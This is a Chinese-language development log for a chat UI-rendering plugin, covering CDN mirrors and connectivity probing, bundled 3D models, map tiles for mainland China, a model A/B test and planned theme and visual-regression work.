  - C10 连通性探测：插件端并发 HEAD（每个 2 秒）探 jsDelivr / npmmirror / unpkg / Wikipedia / Wikimedia / 地图瓦片，缓存 1 小时，写进 runtime-config.json（`networkProbe`），`network-probe.json?refresh=1` 强制重测；设置 → 网络与资源新增「连通性」卡片（各主机耗时 / 不可达 + 重新检测 + 切换预设建议）；Wikipedia 与 Wikimedia 都不可达时照片工具立即返回占位提示，不再等 8 秒
  - C11 预连接：页面需要库且首选源是公共 CDN 时注入 `<link rel="preconnect" crossorigin>`；插件自带路由已是 `immutable` 长缓存，不再预连接
- Batch F 离线 / 中国大陆可用性 ✅（用户批准第 1–4 项，地图用高德）：
  - F1 离线 ESM：gsap 也随插件自带；`import gsap from 'gsap'`、`gsap/ScrollTrigger` 等、`d3`、`chart.js` / `chart.js/auto` / `chart.js/helpers` 全部映射到插件本地文件。d3 / Chart.js 的 ESM 包装由 `scripts/vendor-assets.mjs` 从锁定版本的 UMD 文件生成（导出名直接取自被包装的文件，版本号写进文件名以配合 immutable 缓存），不再经过 esm.sh。真实 Chromium 验证：importmap 下 d3 / Chart（含 registerables、auto、helpers）/ gsap + ScrollTrigger 全部可用，零外网请求
  - F2 自动选源 + 国内镜像：默认 `cdnPreset` 改为 `auto`：插件自带 → 探测可达的镜像按耗时排序（无探测时 npmmirror → jsDelivr）；新增 Zstatic、staticfile 两个国内镜像（staticfile 只用于逐字节核对过的 6 个文件），并纳入探测；一个 SRI hash 覆盖所有镜像
  - F3 照片兜底：Wikimedia 不可达时不再输出 Commons 地址和署名，行程卡直接显示「地名地图卡」（站点周围 3×2 块底图 + 图钉 + 地名；大陆用高德，其他地区 OSM / Esri）；顺手修了地图卡瓦片被作者 `.photo img {width:100%}` 拉伸、以及瓦片 `<img>` 被误当作照片导致卡片仍显示灰底的问题
  - F4 高德底图：新增 `mapTiles`（自动 / 高德 / 海外）；自动模式在探测像中国大陆网络（Wikipedia + Wikimedia 都不可达，或 Esri 不可达 / 比高德慢 4 倍以上）时用高德瓦片，并把 Leaflet 切到 GCJ-02 坐标系，作者照常写 WGS-84 坐标，标记、路线、fitBounds 都对得上；地图中心不在中国大陆时自动换回下一个底图。真实 Chromium 对照：同一组 WGS-84 标记在高德与 OSM 上落在同一条街。注意：高德公开瓦片接口个人使用可以，商用需高德授权（设置里已注明，商用部署选「海外」）
  - 设置 → 网络与资源：连通性卡片放最前，并写明自动模式选了什么（库的镜像顺序 / 地图底图 / 行程照片来源）；资源源、自定义地址、地图底图收进折叠的「高级：手动指定」
  - 限制：沙箱在海外，大陆真实可达性无法在这里测；发布后需在大陆网络下点「重新检测」确认
- R5-3 宿主 3D 舞台 + CC0 模型检索 ✅：
  - 写法：`<div data-iui-3d='{"model":"polyhaven:ArmChair_01","hotspots":[…]}'>`（也可 `khronos:名字`、jsDelivr / GitHub raw / Poly Haven 上的 https .glb、或 `"shape"` 基础形状）；宿主负责环境光 + 三点光、柔和接触阴影 / 展台、按投影轮廓自动取景（并修正透视偏心）、阻尼旋转、方向键 / + − / Home、32px 工具条（自动旋转 / 重置）、热点圆点（点击飞镜头 + 说明条 + `iui3d:hotspot` 事件，被模型挡住时变淡）、动画片段、光标 look、`data-iui-3d-layer="back|front"` 大字层、加载百分比、失败显示灰色示意形状 + 提示、不在视口不渲染、移除即释放
  - 手势：普通滚轮滚页面，Ctrl/⌘ + 滚轮才缩放；触屏 `pan-y` 不劫持纵向滚动
  - 自带 GLTFLoader / DRACOLoader（wasm 解码，CSP 加 `worker-src blob:`）/ meshopt / RoomEnvironment；CSP connect-src 放行 Poly Haven、GitHub raw；Poly Haven / Khronos 模型自动显示 CC0 署名行
  - 新工具 `find_3d_models`：查 Poly Haven（索引缓存 6 小时，附体积 / 尺寸 / 面数）+ 精选 11 个 Khronos CC0 样例，中英文关键词均可；连通性探测新增「Poly Haven 模型」，不可达时只查 Khronos
  - 3D 起始模板、裁判提示、设计系统文档改为用宿主舞台，不再手写渲染器；常驻提示词不变（3,588 字符）
  - 验证：真实 Chromium（软件渲染）跑通基础形状 + 热点、测试 GLB（节点热点、动画片段）、真实 Poly Haven ArmChair_01（约 4–9 秒）、真实 Khronos SheenChair（约 4 秒）、光标 look、坏链接兜底；E2E 新增 3D 用例（GLB 用路由模拟）；视觉评分 scene-3d 主体占比 50%
  - 限制：模型主机在中国大陆的可达性未验证（沙箱在海外）；Khronos 模型 2–13MB；离线导出不内嵌远程模型；任意模型主机受 CSP 白名单限制（其他域名需用户提供可达的 GLB 或扩展白名单）
- R5-3b 处理上一轮 3D 限制 ✅：
  - 随插件自带 11 个 CC0 模型（共 3.8MB，单个 90–880KB）：Poly Haven 的扶手椅、相机、电视、陶瓷花瓶、收音机、台灯、苹果、盆栽、小黄鸭，加 Khronos 的玩具车、水瓶。用 gltf-transform 重新编码（meshopt 几何 + WebP 贴图，≤1024px），放在 `lib/assets/vendor/iui-models@1/`；署名写进 NOTICE 和 `assets/models/README.md`
  - 页面照常写 `polyhaven:ArmChair_01` / `khronos:ToyCar`。如果是自带模型，加载顺序是：插件本地路由 → 本包在 npmmirror / jsDelivr 上的副本 → 原始主机；没有网络也能显示
  - `find_3d_models` 先查自带模型，结果标 `bundled=yes`，同分时排在前面；Poly Haven 不可达时仍能返回自带模型
  - 下载超时：15 秒没有新数据，或总共超过 90 秒，就放弃当前来源，换下一个，都失败才显示灰色示意形状，不会一直卡在加载中
  - 任意模型主机：CSP 白名单以外的 https GLB / glTF 走插件同源代理 `/proxy?kind=model`（≤32MB、60 秒；沿用内网 / 回环拦截；按文件内容判断类型，只放行 GLB、glTF JSON、`.bin`、图片，HTML 和其他 JSON 一律拒绝）
  - 离线导出内嵌模型：最多 6 个，在 15MB 预算内写进 `window.__iuiModelInline`。自带模型和 Khronos 用 GLB；Poly Haven 转成 glTF JSON，贴图和缓冲改成 data URI。超出预算的模型列为失败，页面照样导出；导出文件里的本地代理地址清空，本地模型地址改成本包的 jsDelivr 地址
  - 节点热点取景：按部件包围球计算距离（主视距的 0.5–1.2 倍），盖子这类大部件不会再撑满画面
  - 验证：真实 Chromium 断网模式下 11 个自带模型全部从本地路由加载（3.5–7 秒，软件渲染），外网请求为 0；代理模型、内嵌模型、卡住的下载（缩短计时器后 3 秒内退回示意形状）也都通过；E2E 新增「自带模型走镜像副本、不访问原站」；单测 15 个（tests/r5-3b-models.spec.ts）
  - 仍有的限制：沙箱在海外，没法测大陆网络下 Poly Haven / GitHub raw 能不能连上（现在靠自带模型 + 国内镜像 + 超时兜底）；npm 副本要等这个版本发布后才有；非自带的 Khronos 模型仍是 2–13MB
- 下一步：全部修复项已完成 → 按约定统一做推送发布（提交 lib/）、延迟测量、宽 E2E / golden 实跑与提示词 A/B

## dsh 实机 A/B（0.2.1-rc.2 · MiniMax M3.1 Flash via Kilo）

- 固定开销：每次调用多约 2.2k token（qa：8,082 vs 5,902），纯问答耗时不变（约 8–10 秒）
- 页面回合（修复后）：90–180 秒，输出 8–14k token（含推理），提示 20–46k（大部分命中缓存）；无插件基线做行程页 15 分钟未完成（环境限制，不算公平对比）
- 实测发现并修复：
  1. dsh 0.2 步号从 1 开始 → 回合开头的提示从没注入（a29d9e0）
  2. dsh 0.2 在 pre-step 之后才记录用户消息 → 提示回答的是上一个问题（b89cf7b）
  3. `---find <文字>` 写在同一行 → 补丁报空 → 整页重生成；现已兼容
  4. 首字检查在只收到 `` ``` `` 时就判违规 → 误触发整页重写；现在等开头能确定后再判
  5. MiniMax 用 `---```` 一行收尾 → 围栏不闭合 → 整页重写；流式输出时改写成正常的收尾
- 每次纠错都是同回合整页重生成，输出和耗时翻倍，所以 3–5 是主要的浪费来源
- 修完 3–5 后复测（每项 2 次）：所有回合都没有再纠错；改深色改为 iui-patch，35–61 秒、输出 2–3k（之前 90–101 秒、10–12k）；天气 1 步 90 秒；行程 145–177 秒（3 步：载入技能、取照片、出页面）

## 下个版本 · R6 品味层（接入 taste-skill，暂缓）

来源：https://github.com/Leonxlnx/taste-skill（MIT）。思路是把它的「设计方向 / 配色 / 字体 / 首屏 / 区块」库提炼成宿主侧数据，每轮按需抽签，而不是把整份 skill 塞进提示词。

- 范围：只用于页面类请求（落地页、作品集、活动、餐厅、产品页）；仪表盘、工具类改抽应用风格（密度、图表配色、表格样式）。聊天里的普通卡片不受影响
- 每轮品味单：宿主从库里抽出 方向 × 配色 × 字体组合 × 首屏蓝图 × 2–3 个区块蓝图，拼成 ≤约 1000 字符的 `[iui-taste]` 附加提示，只在页面类请求时发；常驻提示词不变（<3600 字符）
- 规则分层：严格的版式规则（栅格、留白节奏、字号阶梯、禁用套路）只对页面模式生效；其他模式维持现有宿主规则
- 自检：G15 加入品味检查（字体组合超过 2 种、强调色超过 2 种、首屏没有主视觉、区块重复、居中段落过长等），只提示、不算严重问题；可选「自动修一轮」，默认关闭
- 字体：打包 8–10 款 Google Fonts 的 OFL 拉丁字体（展示衬线、窄体、几何无衬线、mono，约 1–2MB，woff2 子集）；不用 Fontshare（许可不允许再分发）。中文回退到系统宋体 / 黑体，并按中文调整行高和字距（不加负字距、标题不用全大写）
- 库：提炼后约 150–250KB（方向、配色、字体组合、首屏 / 区块蓝图），跳过 sites.json 和图片
- starter：新增 2–3 个页面类 starter（编辑式落地页、产品发布、活动 / 餐厅）
- 评测：把它的 6 个 eval 翻成 golden 用例，和不带品味单的版本做线上 A/B（质量评分 + 输出 token）
- 待定：范围是否只限页面类（建议是）、字体体积是否可以接受、自动修复开关默认关


## 视觉方案定稿（第 1、2 轮对比图确认）
- 第 1 轮：默认 daisyUI「IUI 中性」（iui / iui-dark），内置可切换 corporate、dim；移除旧 OIU 主题。图表 ECharts 精修；表格 AG Grid 精修；脑图 ECharts 树图；3D 默认陶土 Clay，保留卡通 Toon、极简数据 Data；动效＝动效规范 + Motion/Flip 配方；Inter 字体、HDRI 离线内置。
- 第 2 轮（⑥–⑩）：**全部按「推荐」**——表单/交互、内容/数据/媒体、6 个页面模板（行程浅灰底图+墨色编号路线、天气温度区间条、定价推荐档反色、酒店评分标签、会议室“现在”线、看板状态点/进度/头像）、图形（ECharts 精修、横向流程图、Mermaid 灰阶主题）、暗色/手机 390/加载-空-出错-降级状态。
- Bug：`src/themes/iui-default.ts` 的 `--dsl-g-radius-control: 999px` 导致表格外框/视频等容器变椭圆 → **单独修，须用户点头后再动代码**。
- 演示稿位置：/data/work/cmp（site/r2、final/1–10）。
- 状态：仍为讨论阶段，未改仓库代码。

## 第 3 轮：插件界面 + 主题管不到的部分（「按你的建议来」后执行）

### 插件界面对比（⑪ final/11-plugin-chrome.png、⑫ final/12-settings.png；演示页 site/r2/chrome-*.html）
- 工具栏 / 更多菜单：改成图标按钮 + 分组菜单（外观·重新加载 / 导出与分享 / 保存为模板 / 反馈一行）；修「这页怎么样?」折行
- 外观弹层：分段控件（tabs-box），标注「仅此页」；强调色 7 个 + 自定义
- 修改失败卡：红色「错误」→ 黄色提示 + 人话（「已保留修改前的版本」），原始报错（find text not found…）收进「技术细节」；卡片宽度对齐消息列
- 统一状态：生成中骨架屏（带已接收字节）、toast（成就 / 已保存为模板 + 撤销）
- 模板抽屉：标题由「GenUI 面板」改为「模板」，增加「我的」分类，卡片带缩略预览
- 删除残留空壳：成就面板（「目录组件卡已移除」）、目录面板（「目录面板已移除」）两个死入口；成就只保留 toast
- 设置 → IUI：单份预览 + 浅/深切换（修 12,48 截断、平均时长 / 4m 12s 折行、底部按钮被裁）；各项改成行列表；连通性改三列小表；按钮不折行；底部「N 项改动未保存」条
- 深色宿主：同一套组件跟随 iui-dark

### 主题管不到的部分（模型自己写的样式 / 库）
1. 提示词与 starter：`src/shared/oiu-pattern-starters.ts` 与常驻提示里的变量名、类名全部换成 daisyUI 体系（`--color-base-content`、`btn`/`card`/`stat` 等）；现在的 lint 提示仍指向旧的 `--color-text-*`、`.iui-stat`，迁移后必须同步，否则模型会写出主题不认识的变量
2. 设计检查（`src/shared/design-lint.ts` → `fence-feedback.ts`）：
   - 现在只扫静态 CSS 规则里的同一条前景/背景，抓不到 JS 切换的选中态（东京行程「第 1 天」橙字橙底就是这种）→ 加渲染后检查：沙箱内对可见文字取计算后的颜色/背景做对比度检查，作为 G15 的一项
   - 现在只在下一轮提示「不要重做已完成的页面」，问题页面会一直留着 → 严重对比度问题（< 3:1）走一次轻量补丁修复（复用 iui-patch，默认开，可在「自动修复」里关）
3. 第三方库默认主题：vendor-registry 里的 chart.js、d3、leaflet、gsap 等在沙箱启动时注入一份跟随主题的默认值（chart.js 的 `Chart.defaults` 颜色/字体、leaflet 浅灰底图与墨色标记、d3 用 CSS 变量取色），模型不写样式时也是统一风格
4. 覆盖边界（有意改样式的情况）：
   - 页面 `accent:`（page-accent.ts）：只改 primary 一组，不允许改底色/文字色
   - 设置 customTokensJson：只开放白名单 token（强调色、圆角、密度、字号），其他忽略并提示
   - 用户模板、作者写的 CSS：保留原样，不强行套主题；在模板卡片上标「自定义样式」
5. 旧对话 / 导出文件：旧对话的 iui-html 在客户端重新渲染，会自动换新主题（上线前抽 20 个旧会话截图核对）；已下载的离线 HTML、图片不会变，这点写进更新说明

### 视觉回归（每种围栏都要有）
- 把 `scripts/e2e-visual.mts` 从注入 `dsh-ui`（F16 已默认关闭，现在注入会失败）改为注入 `iui-html`；保留一组打开 `legacyFences` 的用例覆盖旧 GenUI
- 覆盖：iui-html（6 个模板页 + 状态页）、iui-patch、svg 围栏、PlotBlock、KaTeX、Mermaid、ECharts / AG Grid / 脑图 / 3D、旧 GenUI 围栏；插件界面（工具栏、更多菜单、外观、修改失败卡、模板抽屉、设置页）；导出（离线 HTML、保存为图片、standalone-theme）
- 每项拍浅色 / 深色 / 390 宽三张，和基线做像素差 + visual-score.mts 打分，超阈值则 CI 失败
- 状态：讨论阶段，未改仓库代码；999px 修复仍等用户点头
